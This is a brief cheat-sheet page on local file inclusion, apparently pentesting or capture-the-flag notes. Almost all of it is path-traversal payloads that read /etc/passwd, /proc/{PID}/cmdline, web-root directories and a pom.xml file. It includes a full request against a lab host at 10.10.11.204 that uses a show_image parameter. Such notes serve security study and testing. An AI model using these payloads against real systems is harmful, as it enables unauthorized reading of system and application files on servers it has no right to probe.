# Local File Inclusion

Payloads

```powershell
/etc/passwd
```

Show command used to run the process

```powershell
/proc/{PID}/cmdline
```

```powershell
../../../../../../etc/passwd
```

<pre class="language-powershell"><code class="lang-powershell">http://10.10.11.204:8080/show_image?img=<a data-footnote-ref href="#user-content-fn-1">../../../../../../etc/passwd</a>
</code></pre>



Enumerate filesystem

```powershell
../../../../../../var/www
```

```powershell
 ../../../../../../var/www/WebApp
```

```powershell
 ../../../../../../var/www/WebApp/pom.xml
```

[^1]: 
